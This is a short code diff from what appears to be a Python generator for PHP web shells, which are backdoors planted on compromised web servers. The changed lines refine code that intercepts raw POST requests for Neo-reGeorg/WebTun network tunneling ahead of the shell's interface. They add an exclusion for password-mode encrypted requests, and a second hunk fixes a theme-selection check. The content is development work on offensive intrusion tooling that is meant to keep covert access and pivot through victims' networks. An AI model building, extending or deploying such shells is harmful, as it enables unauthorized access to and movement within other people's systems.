@@ -119,9 +119,12 @@ def _build_tunnel_block(tunnel_path_arg, exclude):
 
     # POST without form 'action' is a Neo-reGeorg/WebTun tunnel command
     # (raw binary body) — must be intercepted before the shell UI renders.
+    # Exclude __enc: password-mode fetchJSON sends only __enc; action lives
+    # inside the ciphertext and is merged into $_POST by crypto.php later.
     block = (
-        "// Neo-reGeorg tunnel — intercept raw POST before shell UI\n"
-        "if ($_SERVER['REQUEST_METHOD'] === 'POST' && !isset($_POST['action']) && !isset($_POST['__auth_pass'])) {\n"
+        "// Neo-reGeorg / WebTun — intercept raw POST before shell UI\n"
+        "if ($_SERVER['REQUEST_METHOD'] === 'POST' && !isset($_POST['action']) "
+        "&& !isset($_POST['__auth_pass']) && !isset($_POST['__enc'])) {\n"
         "ob_end_clean();\n"
         + code + "\n"
         "exit;\n"
@@ -142,7 +145,7 @@ def _resolve_palette(args):
     palette = {}
     theme_name = 'random'
 
-    if args.theme:
+    if args.theme is not None:
         palette = dict(THEME_PRESETS[args.theme])
         theme_name = args.theme
     elif not args.accent:
